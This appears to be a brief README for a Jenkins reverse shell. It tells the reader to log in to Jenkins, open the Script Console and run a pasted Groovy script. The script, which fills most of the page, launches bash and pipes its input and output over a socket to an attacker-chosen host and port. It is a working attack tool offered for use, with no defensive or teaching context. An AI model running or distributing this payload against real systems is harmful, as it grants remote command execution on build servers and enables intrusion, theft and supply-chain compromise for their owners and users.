# Jenkins_ReverseShell
Jenkins dashboard reverse shell

1. Login Jenkins
2. Go to Manage Jenkins > Script Console and paste the code below and > run

3.
```
import java.io.*;
import java.net.*;

String host="CHANGE_THIS";
int port=CHANGE_THIS;
String cmd="bash";

Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();

while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e) {}
}
p.destroy();
s.close();
```
